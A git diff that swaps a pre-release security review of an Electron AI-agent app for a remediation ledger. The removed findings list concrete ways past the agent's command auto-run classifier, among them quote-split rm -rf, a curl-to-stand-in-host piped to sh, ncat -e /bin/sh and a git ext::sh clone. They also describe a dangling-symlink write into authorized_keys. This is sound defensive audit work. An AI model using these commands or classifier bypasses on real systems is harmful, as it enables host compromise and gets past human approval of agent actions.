@@ -1,192 +1,89 @@
-# Copse — Pre-General-Release Security Review
+# Copse GA security remediation ledger
 
-**Scope:** Full-codebase review of the Copse Electron app ahead of general release.
-Seven parallel audits covered: Electron process hardening, the IPC surface, the
-shell-execution/approval boundary, filesystem/path containment, dynamic code
-loading (custom tools / MCP / plugins / install), renderer XSS & web content, and
-secrets/network egress.
+This ledger supersedes the point-in-time report added by
+[#434](https://github.com/copse-dev/agent-pane/pull/434) for
+[#385](https://github.com/copse-dev/agent-pane/issues/385). It records the
+current disposition of every original finding and the material findings raised
+by the July follow-up review. A status of **accepted** requires the explicit
+owner/date/rationale record described below; it is not a GA waiver.
 
-**Overall:** The architecture is security-conscious and many boundaries are
-genuinely well built (narrow `contextBridge`, main-frame IPC gating, path
-containment for the common cases, secret scrubbing for child processes, strict
-DOMPurify + mermaid `strict`, MCP project-config trust gating). However, there are
-**two confirmed High-severity issues** and a **structural High** in the
-command-execution boundary that should be addressed before GA, plus a cluster of
-Mediums. Findings below are de-duplicated across the seven audits and ordered by
-severity. The two headline items were re-verified by hand against the source.
+## Review record
 
----
+| Field                   | Value                                                                                                                                                                                                       |
+| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Review date             | 2026-07-17                                                                                                                                                                                                  |
+| Reviewed revision       | `10fae54bedcb3975f32b1b8a9a7da883fd05b057` (`origin/main`)                                                                                                                                                  |
+| Current re-review       | Codex automated source/issue/PR verification for [#805](https://github.com/copse-dev/agent-pane/issues/805)                                                                                                 |
+| Prior review            | Seven-surface pre-GA review in [#385](https://github.com/copse-dev/agent-pane/issues/385), followed by the July independent two-reviewer audit recorded on that issue                                       |
+| Human security reviewer | Pending                                                                                                                                                                                                     |
+| GA waivers              | None recorded                                                                                                                                                                                               |
+| GA sign-off             | **Not granted.** Open residuals include M3, L1, and L8; open GA blockers include [#662](https://github.com/copse-dev/agent-pane/issues/662) and [#664](https://github.com/copse-dev/agent-pane/issues/664). |
 
-## High severity
+Status vocabulary is deliberately small: **open**, **fixed**, **accepted**, or
+**superseded**. “Fixed” means the cited control and regression coverage are on
+the reviewed revision. Open-PR code is never counted as fixed.
 
-### H1 — Command auto-run classifier is bypassable; on Linux/Windows that means silent host RCE
+## Original findings
 
-**Files:** `src/main/services/shell-scope.ts` (`normalizeShellCommandForAnalysis` :81, pattern lists :46–56, `analyzeShellCommand`), `src/main/services/permission-policy.ts:78`, `src/main/project-sandbox/spawn.ts:106`
+| ID                                                                   | Status    | Remediation and landed evidence                                                                                                                                                                                                                                                                                                                                                                                                                                     | Regression / current verification                                                                                                                                                                                                                                                                                                                                             |
+| -------------------------------------------------------------------- | --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| H1 — shell classifier bypass enables silent host execution off macOS | **fixed** | Quote/interpreter/git bypass hardening landed in [#391](https://github.com/copse-dev/agent-pane/pull/391) (`d0380602`); the security-boundary fix landed in [#809](https://github.com/copse-dev/agent-pane/pull/809) (`12344564`): without an OS sandbox, shell commands now require approval and the classifier cannot authorize host execution.                                                                                                                   | [`security/shell-scope.test.ts`](../src/main/services/security/shell-scope.test.ts), [`security/permission-platform.test.ts`](../src/main/services/security/permission-platform.test.ts), and [`security/permission-gate.test.ts`](../src/main/services/security/permission-gate.test.ts).                                                                                    |
+| H2 — dangling-symlink write escape                                   | **fixed** | Agent/diff writes gained `assertWorkspaceWriteTarget` in [#390](https://github.com/copse-dev/agent-pane/pull/390) (`ee7217d9`); the renderer gateway gap was closed by [#666](https://github.com/copse-dev/agent-pane/pull/666) (`6a1c7bb4`).                                                                                                                                                                                                                       | [`workspace.test.ts`](../src/main/services/workspace.test.ts) and [`sandbox-fs-client.test.ts`](../src/main/project-sandbox/sandbox-fs-client.test.ts) exercise dangling and parent-symlink escapes.                                                                                                                                                                          |
+| H3 — `settings:get` exposes stored API-key records                   | **fixed** | [#387](https://github.com/copse-dev/agent-pane/pull/387) (`6116e594`) added main-frame enforcement and secret-key rejection.                                                                                                                                                                                                                                                                                                                                        | [`storage/settings-writable.test.ts`](../src/main/services/storage/settings-writable.test.ts) pins `apiKey.*` as secret and renderer-unreadable.                                                                                                                                                                                                                              |
+| M1 — custom-tool `requiresApproval` ignored                          | **fixed** | [#406](https://github.com/copse-dev/agent-pane/pull/406) (`487c2580`) makes `requiresApproval` override remembered grants.                                                                                                                                                                                                                                                                                                                                          | [`security/permission-gate.test.ts`](../src/main/services/security/permission-gate.test.ts) covers the custom-tool approval path.                                                                                                                                                                                                                                             |
+| M2 — Socket Firewall bootstrap unpinned / scripts enabled            | **fixed** | [#399](https://github.com/copse-dev/agent-pane/pull/399) (`de5518f`) pins the `sfw` version and adds `--ignore-scripts`.                                                                                                                                                                                                                                                                                                                                            | [`security/socket-firewall.test.ts`](../src/main/services/security/socket-firewall.test.ts) asserts the exact pin and script suppression.                                                                                                                                                                                                                                     |
+| M3 — trusted project hooks run privileged and default fail-open      | **open**  | [#404](https://github.com/copse-dev/agent-pane/pull/404) (`3ee56d25`) documented and audited the trust boundary. Current hooks remain opt-in and project hooks require workspace trust; their source/command is surfaced, and Cursor `failClosed` is honored. The outside-sandbox execution model remains pending the sandbox-by-default phase in [`hooks-and-feature-packs.md`](./plans/hooks-and-feature-packs.md); no owner acceptance or GA waiver is recorded. | [`hooks/cursor-adapter.test.ts`](../src/main/services/hooks/cursor-adapter.test.ts) covers trusted discovery; [`hooks/failClosed-both-modes.test.ts`](../src/main/services/hooks/failClosed-both-modes.test.ts) pins fail-open and `failClosed` semantics.                                                                                                                    |
+| M4 — credentialed remote-agent base URL unvalidated                  | **fixed** | [#396](https://github.com/copse-dev/agent-pane/pull/396) (`013e84b6`) requires a credential-safe URL and defensively revalidates at use.                                                                                                                                                                                                                                                                                                                            | [`storage/settings-writable.test.ts`](../src/main/services/storage/settings-writable.test.ts) covers schemes, userinfo, and loopback exceptions.                                                                                                                                                                                                                              |
+| M5 — ACP child inherits provider secrets                             | **fixed** | [#395](https://github.com/copse-dev/agent-pane/pull/395) (`f57452af`) builds ACP env from the scrubbed child-process environment.                                                                                                                                                                                                                                                                                                                                   | [`acp/acp-env.test.ts`](../src/main/services/acp/acp-env.test.ts) asserts provider keys are removed and allowed overrides survive.                                                                                                                                                                                                                                            |
+| M6 — auto-run sandbox commands receive default network egress        | **fixed** | [#400](https://github.com/copse-dev/agent-pane/pull/400) (`853d6247`) changed the contained profile to deny-all network and no local binding.                                                                                                                                                                                                                                                                                                                       | [`project-sandbox/config.test.ts`](../src/main/project-sandbox/config.test.ts) pins the contained network profile. The later process-global ACP scope is tracked separately below.                                                                                                                                                                                            |
+| M7 — browser guest can navigate to privileged schemes                | **fixed** | [#397](https://github.com/copse-dev/agent-pane/pull/397) (`f9d31e8e`) restricts guest navigation and redirects to web schemes / `about:blank`.                                                                                                                                                                                                                                                                                                                      | [`browser/browser-origin-policy.test.ts`](../src/main/services/browser/browser-origin-policy.test.ts) and [`web-contents-lockdown.test.ts`](../src/main/windows/web-contents-lockdown.test.ts).                                                                                                                                                                               |
+| M8 — fs-watch / write-path symlink swap gaps                         | **fixed** | Watch callbacks revalidate containment via [#401](https://github.com/copse-dev/agent-pane/pull/401) (`7f7656f6`); write choke points are covered by H2 and renderer gateway [#666](https://github.com/copse-dev/agent-pane/pull/666).                                                                                                                                                                                                                               | [`workspace.test.ts`](../src/main/services/workspace.test.ts) covers a watched path swapped to an external symlink; [`sandbox-fs-client.test.ts`](../src/main/project-sandbox/sandbox-fs-client.test.ts) covers gateway writes.                                                                                                                                               |
+| L1 — plaintext API-key fallback without OS keyring                   | **open**  | [#405](https://github.com/copse-dev/agent-pane/pull/405) documented the risk. [#734](https://github.com/copse-dev/agent-pane/pull/734) (`7c308085`) now refuses the fallback until the user explicitly consents and surfaces an unencrypted badge/note. The plaintext-at-rest option remains available and has no owner acceptance or GA waiver recorded.                                                                                                           | [`setup/api-keys-section.test.ts`](../src/renderer/views/setup/api-keys-section.test.ts) covers warning, consent, and decline.                                                                                                                                                                                                                                                |
+| L2 — remote-artifact image path dead and brittle                     | **fixed** | [#410](https://github.com/copse-dev/agent-pane/pull/410) (`77a6ce7c`) class-gates artifact images and strips `src` until post-sanitize hydration.                                                                                                                                                                                                                                                                                                                   | The [landed sanitizer regression](https://github.com/copse-dev/agent-pane/blob/77a6ce7cfb024afcba1c96f6ec47cf4200e77c60/src/renderer/markdown/sanitize.test.ts) covers arbitrary and genuine artifact images; current app integration remains covered by [`markdown/browser-links.test.ts`](../src/renderer/markdown/browser-links.test.ts).                                  |
+| L3 — streaming pending markdown bypasses sanitization                | **fixed** | [#407](https://github.com/copse-dev/agent-pane/pull/407) (`6fb78789`) routes pending fragments through `sanitizeRenderedMarkdown`.                                                                                                                                                                                                                                                                                                                                  | The [landed pending-fragment regression](https://github.com/copse-dev/agent-pane/blob/6fb787895dd040e72e00a80e62876c5df01fbdb9/src/renderer/markdown/streaming.test.ts) moved with the renderer core to `@copse/streaming-markdown`; app-level convergence remains covered by the focused [`markdown-streaming-*.e2e.ts`](../tests/e2e/markdown-streaming-list.e2e.ts) specs. |
+| L4 — IPC handlers lack frame and input validation                    | **fixed** | [#402](https://github.com/copse-dev/agent-pane/pull/402) (`09a17eae`) added main-frame checks and Zod schemas to MCP, LM Studio, and agent/storage-key surfaces.                                                                                                                                                                                                                                                                                                    | [`ipc/ipc-guards.test.ts`](../src/main/ipc/ipc-guards.test.ts) covers URL, thread-id, and argument guards.                                                                                                                                                                                                                                                                    |
+| L5 — build-time fetch-and-execute lacks integrity pinning            | **fixed** | [#408](https://github.com/copse-dev/agent-pane/pull/408) (`85229915`) introduced fail-closed asset checksums; the current gortex fetch keeps a committed per-asset SHA-256 manifest, `electron-rebuild` runs only from the lockfile-installed local binary, and bundled skills are commit-pinned.                                                                                                                                                                   | [`fetch-gortex.mts`](../scripts/fetch-gortex.mts) rejects absent/mismatched hashes before extraction or execution; [`gortex-checksums.json`](../scripts/gortex-checksums.json) is the reviewed manifest. Dedicated build-security CI remains tracked in #664.                                                                                                                 |
+| L6 — workspace sibling-prefix treated as inside                      | **fixed** | [#398](https://github.com/copse-dev/agent-pane/pull/398) (`fe7096a0`) requires root equality or a separator-delimited descendant.                                                                                                                                                                                                                                                                                                                                   | [`security/shell-scope.test.ts`](../src/main/services/security/shell-scope.test.ts).                                                                                                                                                                                                                                                                                          |
+| L7 — `git:fileDiff` blob path not contained                          | **fixed** | [#403](https://github.com/copse-dev/agent-pane/pull/403) (`a232ba50`) validates the blob path against the workspace.                                                                                                                                                                                                                                                                                                                                                | [`github/git-service.test.ts`](../src/main/services/github/git-service.test.ts).                                                                                                                                                                                                                                                                                              |
+| L8 — renderer CSP retains `style-src 'unsafe-inline'`                | **open**  | [#409](https://github.com/copse-dev/agent-pane/pull/409) (`9f2fc8d5`) records why Monaco/mermaid require it and the compensating CSP, strict-mermaid, and sanitization controls. The directive remains and no owner acceptance or GA waiver is recorded.                                                                                                                                                                                                            | [`markdown/mermaid.test.ts`](../src/renderer/markdown/mermaid.test.ts) and the upstream renderer sanitizer tests pin the compensating boundaries. Re-review if Monaco/mermaid rendering or CSP changes.                                                                                                                                                                       |
 
-The decision to auto-run an agent-proposed shell command without human approval is
-made by regex matching over the **raw, un-lexed** command string. The only
-de-obfuscation applied is backslash removal. Multiple trivial bypasses were
-verified empirically:
+## Findings added after the original review
 
-- **Quote-splitting:** `r""m -rf .`, `c""url http://evil | s""h`, `p""ython3 -c …` — the shell collapses the empty quotes; the `\b`-anchored patterns do not match, so the command is classified "safe / sandbox".
-- **Interpreter execution of agent-written files:** `node ./x.js`, `bash x.sh`, `ruby -e …`, `perl -e …`, `python <<EOF…EOF` are not in the inline-exec list. The agent can `write_file` a malicious script (looks benign at approval) then auto-run it; the classifier sees only `node ./x.js`.
-- **git tricks:** `git -c protocol.ext.allow=always clone ext::sh -c '…'` and `git submodule update` evade the `\bgit\s+(push|pull|…)\b` detector.
-- **`ncat -e /bin/sh …`** evades `\bnc\b`.
+These are part of the ledger even when they overlap an original finding. Their
+status is verified against current `main`, not inferred from a closed issue.
 
-On **macOS**, seatbelt contains most of this (but not in-workspace destruction —
-`r""m -rf` still wipes the repo — nor the network egress in M6). On
-**Linux/Windows there is no OS sandbox at all** (`spawn.ts` gates the sandbox on
-`darwin`); the boundary is this regex plus an _optional_ local LLM classifier. If a
-user has the local safety model enabled (a documented, supported config), any of
-the above bypasses becomes **unprompted host code execution**.
+| Finding                                                                                                                            | Status         | Current evidence and next action                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| ---------------------------------------------------------------------------------------------------------------------------------- | -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| [#578](https://github.com/copse-dev/agent-pane/issues/578) — renderer `fs:writeFile` dangling-symlink escape                       | **fixed**      | [#666](https://github.com/copse-dev/agent-pane/pull/666) (`6a1c7bb4`) routes gateway writes through the same guard; regression in [`sandbox-fs-client.test.ts`](../src/main/project-sandbox/sandbox-fs-client.test.ts).                                                                                                                                                                                                                                                                                                                       |
+| [#579](https://github.com/copse-dev/agent-pane/issues/579) — provider secrets in child-process environments                        | **fixed**      | [#789](https://github.com/copse-dev/agent-pane/pull/789) (`9be71fe9`) makes stripped env the default; covered by [`exec/command-runner.test.ts`](../src/main/services/exec/command-runner.test.ts) and [`acp/acp-env.test.ts`](../src/main/services/acp/acp-env.test.ts).                                                                                                                                                                                                                                                                     |
+| [#581](https://github.com/copse-dev/agent-pane/issues/581) — additional command-classifier execution gaps                          | **fixed**      | [#792](https://github.com/copse-dev/agent-pane/pull/792) (`7a02d7c3`) covers `open`, local executables, and `/dev/tcp`; [#809](https://github.com/copse-dev/agent-pane/pull/809) removes classifier authorization off-sandbox. Regression in [`security/shell-scope.test.ts`](../src/main/services/security/shell-scope.test.ts).                                                                                                                                                                                                             |
+| [#655](https://github.com/copse-dev/agent-pane/issues/655) — plaintext-fallback visibility                                         | **superseded** | Folded into L1 after [#734](https://github.com/copse-dev/agent-pane/pull/734) added explicit consent and visible at-rest status.                                                                                                                                                                                                                                                                                                                                                                                                              |
+| [#660](https://github.com/copse-dev/agent-pane/issues/660) — model-fetch SSRF / credential exfiltration                            | **fixed**      | [#732](https://github.com/copse-dev/agent-pane/pull/732) (`154baef8`) validates credential URLs and blocks redirect forwarding; covered by [`providers/provider-models.test.ts`](../src/main/services/providers/provider-models.test.ts).                                                                                                                                                                                                                                                                                                     |
+| [#661](https://github.com/copse-dev/agent-pane/issues/661) — MCP server can self-assert read-only auto-allow                       | **fixed**      | [#733](https://github.com/copse-dev/agent-pane/pull/733) (`5c8e2097`) also requires a structurally read-only tool name; covered by [`security/permission-gate.test.ts`](../src/main/services/security/permission-gate.test.ts).                                                                                                                                                                                                                                                                                                               |
+| [#662](https://github.com/copse-dev/agent-pane/issues/662) — integrated terminal bypasses the seatbelt                             | **open**       | Reviewed `main` still has `ensureTerminalPermitted() => true` and passes `unsandboxed: true`. [#833](https://github.com/copse-dev/agent-pane/pull/833) is closed without merge; do not count it as remediation. This remains a GA blocker until a replacement lands and is reverified.                                                                                                                                                                                                                                                        |
+| [#663](https://github.com/copse-dev/agent-pane/issues/663) — raw-regex shell classifier architecture                               | **superseded** | Token-aware classification landed in [#709](https://github.com/copse-dev/agent-pane/pull/709) (`4cabe483`), while [#809](https://github.com/copse-dev/agent-pane/pull/809) made the classifier non-authoritative off-sandbox. Tracked under H1.                                                                                                                                                                                                                                                                                               |
+| [#664](https://github.com/copse-dev/agent-pane/issues/664) — missing dependency/SAST/secret CI gates                               | **open**       | No gates are on reviewed `main`. Draft [#903](https://github.com/copse-dev/agent-pane/pull/903) is the current mergeable replacement for stale draft [#813](https://github.com/copse-dev/agent-pane/pull/813); reverify after merge. This remains a GA blocker.                                                                                                                                                                                                                                                                               |
+| [#803](https://github.com/copse-dev/agent-pane/issues/803) — ACP process-global network scope leaks to unrelated auto-run commands | **fixed**      | [#810](https://github.com/copse-dev/agent-pane/pull/810) (`0e1355ad`) exposes active global scopes and forces approval for overlapping shell/background starts until all scopes release. [`network-scope.test.ts`](../src/main/project-sandbox/network-scope.test.ts) covers ref-counted overlap and [`security/permission-gate.test.ts`](../src/main/services/security/permission-gate.test.ts) covers forced approval. ASRT still implements the allowlist globally; the invariant is approval during overlap, not per-process attribution. |
 
-**Fix:** Stop matching regexes against an un-lexed string. Tokenize with a real
-shell parser (`shell-quote` is already a dependency) and classify resolved command
-words. Treat "interpreter runs a file/stdin/heredoc" as never-auto-run. On
-platforms with no OS sandbox, do not let the LLM _upgrade_ a command to auto-run
-unless it is on an explicit read-only/build allowlist.
+## GA disposition
 
-### H2 — Write/rename/delete through a dangling symlink escapes the workspace
+No finding may move to **accepted** without a recorded owner, date, rationale,
+and review date. That acceptance still does not waive a `ga-blocker` issue. A GA
+waiver must separately name the issue/finding, approver, date, bounded release,
+expiry/re-review trigger, and compensating controls.
 
-**Files:** `src/main/services/workspace.ts:102` (`resolveThroughExistingPrefix`), `src/main/services/diff-queue.ts:312`/`352`/`332` (raw `fs` writes); same pattern in the write/str-replace tools.
+For the reviewed SHA:
 
-`resolveThroughExistingPrefix` walks up the path with `existsSync`, which _follows_
-symlinks — so a **dangling** symlink (target absent) returns `false`, is treated as
-a normal non-existent leaf, and its parent realpaths to inside the workspace. The
-path passes every `isPathInsideRoot` check, then `fsp.writeFile`/`rename` follows
-the symlink and writes to the outside target. There is no `lstat`/`O_NOFOLLOW`
-guard. Verified empirically on Node 22.
+- Human security review: **pending**.
+- Release-owner sign-off: **pending**.
+- Waivers: **none**.
+- GA decision: **blocked** by the open entries above; this document does not
+  close or waive them.
 
-**Exploit:** a cloned repo ships a checked-in dangling symlink
-`deploy.conf -> ../../../../home/<user>/.ssh/authorized_keys`. The user opens the
-folder and asks the agent to edit `deploy.conf`; the write lands on
-`authorized_keys` outside the workspace → key injection / RCE. Trust state is
-irrelevant — file tools never consult it. Note the agent file-tool path uses raw
-`node:fs` and is **not** routed through the macOS seatbelt gateway (that gateway is
-wired only for the renderer `fs:*` IPC), so this works on macOS too.
+## Maintenance
 
-**Fix:** Before any write/rename/delete, `realpath` the parent and `lstat` the leaf
-(or open `O_NOFOLLOW`); reject if the final component is a symlink leaving the root.
-Apply in `applyWrite`/`applyRename` (both endpoints)/`applyDelete` and the tools.
-
-### H3 — `settings:get` IPC returns raw stored API-key records to the renderer
-
-**Files:** `src/main/ipc/register-handlers.ts:180`, `src/main/services/settings.ts:90,124`
-
-`settings:get` accepts any key ≤128 chars with **no allowlist and no
-`assertMainFrameSender`**, and returns `getSetting(k, null)` → `store.get(key)` from
-the same store where keys live under `apiKey.${provider}`. So
-`window.api.settings.get('apiKey.anthropic')` returns the `StoredKey` record. When
-the OS keyring is unavailable (common on Linux), that record's `enc` is **base64
-plaintext** (`plain:true`), recovered directly. The deliberately boolean-only
-`settings:getKey` handler exists precisely to avoid this; the read path defeats it.
-Contrast `settings:set`, which correctly enforces `isRendererWritableSettingKey`.
-
-**Fix:** Add a read allowlist to `settings:get` rejecting `apiKey.*` (ideally
-restrict to known-readable keys), and add `assertMainFrameSender`. Never return raw
-`apiKey.*` records.
-
----
-
-## Medium severity
-
-### M1 — Custom-tool `requiresApproval: true` flag is silently ignored
-
-`src/main/services/permission-gate.ts:182`, `custom-tools-config.ts:123`. The flag
-is documented and normalized onto the tool but **never read**. A tool that opts into
-always-prompt auto-executes after a single "remember." Honor the flag (bypass the
-remembered-grant when `requiresApproval === true`) or remove it from the
-type/docs so it isn't a false promise.
-
-### M2 — `sfw` (Socket Firewall) bootstrap install is unpinned and unscanned
-
-`src/main/services/socket-firewall.ts:41`. The malware-scanner bootstrap runs
-`npm install -g sfw` with no version pin, no integrity check, and **lifecycle
-scripts enabled** — the one install that protects all others is itself unprotected
-and a plausible typosquat target. Pin an exact version, pass `--ignore-scripts`,
-verify integrity.
-
-### M3 — Cursor project hooks: full-privilege shell on the agent hot path, fail-open
-
-`src/main/services/cursor-hooks.ts:136`, `permission-gate.ts:330`. When enabled
-(off by default) + workspace trusted, a repo's `.cursor/hooks.json` commands spawn
-with `shell:true` outside the sandbox with cloud tool tokens in env, and a
-crashed/slow/timed-out hook is treated as **allow**. Surface project hook commands
-in the trust prompt; consider a separate opt-in for project (vs user) hooks.
-
-### M4 — `remoteAgentBaseUrl` is renderer-writable and unvalidated; the Cursor key is sent to it
-
-`src/main/services/settings-writable.ts:46`, `remote-agent-client.ts:156`. Only a
-length check — no scheme/host validation — yet the Cursor credential is sent as
-`Authorization` to `joinUrl(baseUrl, …)`. `http://attacker` (cleartext) or any
-HTTPS host is accepted, unlike the hardcoded provider base URLs. Require `https:`
-(allow `http:` only for loopback), reject userinfo, constrain/allowlist hosts.
-
-### M5 — ACP external-agent spawn inherits the full unscrubbed `process.env`
-
-`src/main/services/acp/acp-client.ts:63` uses `env: { ...process.env, ...config.env }`,
-unlike every other subprocess sink which routes through
-`envForRendererChildProcess()`. Hands all cloud keys to a third-party CLI. Currently
-**latent** (no production caller wires a config yet), but fix before the path ships:
-base env from `envForRendererChildProcess()`, overlay only the needed provider key.
-
-### M6 — Auto-run "sandbox-contained" macOS commands still get network egress
-
-`src/main/project-sandbox/config.ts:93` / `web-origins.ts:4`. The seatbelt network
-policy applied to _every_ sandboxed spawn (including auto-run) allows
-`*.duckduckgo.com` and **all of localhost on any port** with `allowLocalBinding`,
-while the classifier/system-prompt claims "Network: denied." A contained auto-run
-command can exfiltrate to a local listener or DDG subdomain with no prompt. Use an
-empty allowlist + `allowLocalBinding:false` for the auto-run path; widen only for
-explicitly-approved commands.
-
-### M7 — In-app browser `<webview>` can navigate itself to `file://`
-
-`src/main/windows/web-contents-lockdown.ts:38`, `browser-web-contents.ts`. The
-browser guest is correctly isolated (no node/preload, separate session,
-`webSecurity:true`) but has no navigation allowlist and `file:` is not blocked, so a
-hostile page/redirect can render local files in the guest. Add a
-`will-navigate`/`will-redirect` allowlist (`http(s)`/`about:blank` only).
-
-### M8 — fs-watch path is not re-validated against symlink swaps (TOCTOU)
-
-`src/main/ipc/fs-watcher.ts:12`, and the diff-queue write race (`diff-queue.ts:324`
-does `mkdir` then `writeFile` after the string-based check). Same root cause as H2;
-fd-based, symlink-refusing operations close both.
-
----
-
-## Low severity
-
-- **L1 — API keys stored as base64 plaintext when the OS keyring is unavailable** (`settings.ts:82`). By-design with a console warning and `isApiKeyEncrypted()` UI hint; consider session-only storage or an explicit opt-in, and make the UI warning prominent for GA.
-- **L2 — Remote-artifact `<img>` feature is dead** (sanitizer strips it) — fail-safe today but brittle: a future "fix" that allowlists `img`/`src` without a scoped hook becomes live XSS. Decide: remove it, or make it work _and_ safe with a DOMPurify hook + regression test. (`sanitize.ts:15`, `renderer.ts:154`)
-- **L3 — Streaming "pending" markdown line bypasses DOMPurify** (`streaming.ts:227`). Not exploitable as written (prose escaped, links https-only) but it's the lone exception to the sanitize-before-innerHTML invariant. Wrap it in `sanitizeRenderedMarkdown`.
-- **L4 — Several IPC handlers lack frame check / validation:** `mcp:setEnabled` et al. (`register-handlers.ts:294`), `lmstudio:*` accept an unvalidated outbound `url` (SSRF read primitive against loopback/LAN, `index.ts:117`), `agent:*` `JSON.parse(...) as T` with no schema (`index.ts:185,228`), `agent:*` writes `llm-history:${threadId}` with an unvalidated threadId. Add `assertMainFrameSender` + zod parsing for consistency.
-- **L5 — Build-time fetch-and-exec without integrity pinning:** the build-time binary fetch (`fetch-gortex.mts`, which superseded `fetch-codesearch.mts`) downloads, `chmod 0755`, and executes a third-party binary — now gated on a committed per-asset SHA-256 that fails closed (recorded from the release's Sigstore-signed `checksums.txt`), addressing the original finding; `postinstall-native.mts` still runs unpinned `npx electron-rebuild`; bundled cursor skills are fetched (commit-pinned) but injected as **trusted** prompt with no content hash. Remaining: pin electron-rebuild; reconsider `trusted` status for fetched third-party skills.
-- **L6 — `shell-scope` workspace-root prefix match** uses `startsWith(root)` without a trailing separator, so `/srv/project-secrets` counts as inside `/srv/project` (`shell-scope.ts:140`). Compare against `root + sep`.
-- **L7 — `git:fileDiff` blob path** isn't validated against the workspace boundary the way the working-tree path is (`register-handlers.ts:252`); git pathspecs largely self-contain it, but normalize for consistency.
-- **L8 — `style-src 'unsafe-inline'` in CSP** (`index.html:23`) retained for Monaco/mermaid; `img-src` excludes remote URLs so CSS-exfil is mitigated. Sandbox mermaid in an iframe with stricter CSP as a hardening goal.
-
----
-
-## Notable strengths (keep these)
-
-- Narrow, typed `contextBridge` — no generic `ipcRenderer`/`fs`/`shell`/`require` exposed; webPreferences hardened (`contextIsolation`, `sandbox`, `nodeIntegration:false`); `will-attach-webview` overrides guest prefs in main.
-- `assertMainFrameSender` on the sensitive write/privilege IPC handlers; terminal handlers take no renderer command/env/cwd and are ownership-checked.
-- Path containment (`resolveWorkspacePath`) defeats `..`, absolute paths, and _existing_ symlinks (the dangling case H2 is the gap); `~` not expanded; @-mention resolver index-bound.
-- Displayed approval command == executed command (single parse, `textContent` render, no truncation/TOCTOU); unsandboxed-retry signal is forge-proof; subprocess secret scrubbing (`envForRendererChildProcess`) applied consistently across shell/terminal/MCP/hooks.
-- MCP project configs never spawn in an untrusted workspace and get an empty env allowlist (no `${env:SECRET}` exfil); user/global configs win name collisions; untrusted schemas depth/`$ref`-sanitized.
-- Strict DOMPurify allowlist at every markdown sink; mermaid `securityLevel:'strict'`; untrusted web content stays in the isolated guest; no API key ever returned to the renderer via the intended `getKey` path; provider base URLs hardcoded so a key can't be redirected to an attacker endpoint (except M4).
-- SSRF controls on browser + fetch (private/link-local/metadata/CGNAT blocked, redirect re-validation, size caps).
-
----
-
-## Recommendation for GA
-
-Address **H1, H2, H3 before release** — H1 and H2 are agent/prompt-injection-reachable
-code-exec/escape on the default Linux/Windows configuration, and H3 is a trivially
-reachable credential exposure. The Medium cluster (especially M1, M2, M6) should
-follow shortly after. The Lows are hardening that can be scheduled. The underlying
-architecture is sound; these are fixable without structural change — H1 by
-tokenizing instead of regex-matching, H2/M8 by fd-based symlink-refusing writes, H3
-by a read allowlist.
+Before every release candidate, follow the security-review gate in
+[`releasing-macos.md`](./releasing-macos.md): update the reviewed SHA/date,
+recheck source plus issue/PR state, link new regressions, and record human
+sign-off or explicit bounded waivers. Any security-relevant change after the
+reviewed SHA invalidates sign-off until the ledger is refreshed.
